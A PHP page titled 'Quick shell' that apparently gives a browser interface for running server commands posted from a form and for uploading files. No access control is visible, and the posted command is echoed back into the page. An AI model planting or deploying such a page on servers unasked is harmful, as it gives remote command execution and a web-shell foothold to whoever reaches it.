<?php 
include_once('classes/Shell.class');
$cmd = Shell::parse($_POST['command']);
?>
<html>
<head>
<title>Quick shell</title>
<style>
	* {font-family: Courier New; font-size: 9pt }
	html { height: 100% }
	#shell-form { width: 98% }
	#shell-form, #shell-form *{ padding: 0; margin: 2px 0; background-color: #333; color: #fff }
	input#command { border: none; width: 100% }
	#cwd { color: #ccc }
	#cmd { color: #999; margin: 0 }
	#output pre { margin: 0; padding: 0 }
	#upload { position: fixed; bottom: 0; margin: 0px; width: 98%; padding: 6px 0; text-align: left; vertical-align: middle; background-color: rgba(255, 255, 255, .9) }
	#file-upload-form { margin: 0; padding: 0 }
	#upload-button { background: #eee; border: 1px solid #333; color: #333; border-radius: 5px }
	#loading img { margin-top: 1px }
</style>
<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/ajaxfileupload.js"></script>
<script type="text/javascript">
	function spinner(visible) {
		document.getElementById('spinner').style.display = visible ? '' : 'none';
	}
	function selectFile() {
		document.getElementById('fileToUpload').click();
	}
	function uploadFile() {
		alert(document.getElementById('fileToUpload').value);
	}
	function ajaxFileUpload() {
		if (!$(this).val()) return;
		
		$("#loading")
		.ajaxStart(function() {
			$(this).show();
		})
		.ajaxComplete(function() {
			$(this).hide();
		});
		
		$("#status")
		.ajaxStart(function() {
			$(this).html('Uploading ' + $("#fileToUpload").val() + '...');
			$(this).show();
		})

		$.ajaxFileUpload({
			url: 'ajaxfileupload.php',
			secureuri: false,
			fileElementId: 'fileToUpload',
			dataType: 'json',
			data: {},
			success: function(data, status) {
				if (typeof(data.error) != 'undefined') {
					if(data.error != '') {
						$("#status").html(data.error);
					} else {
						$("#status").html(data.msg);
					}
				}
			},
			error: function(data, status, e) {
				alert(e);
			}
		});

		return false;
	}
</script>
</head>
<body onload="document.shell.command.focus()">
<div id="cmd"><?=Shell::scwd().'$ '.Shell::cmd()?></div>
<form id="shell-form" action="shell.php" method="post" name="shell" onsubmit="spinner(true)">
  <span id="cwd"><?=Shell::scwd()?>$ </span><input type="text" id="command" name="command" style="width:80%" value="<?=$cmd?>"/>
</form>
<div id="spinner" style="display:none"><img src="img/spinner.gif"/></div>
<div id="output"><pre>
<?php
Shell::exec();
?>
</pre></div>
<div id="upload">
	<form id="file-upload-form" name="form" action="" method="POST" enctype="multipart/form-data">
		<input type="file" id="fileToUpload" name="fileToUpload" style="width:0;height:0" onchange="ajaxFileUpload()"/>
		<input type="button" id="upload-button" value="Upload file" accesskey="u" onclick="selectFile()"/>
		<span id="loading" style="display:none"><img src="img/spinner.gif" align="right"/></span>
		<span id="status" style="display:none"></span>
	</form>
</div>
</body>
</html>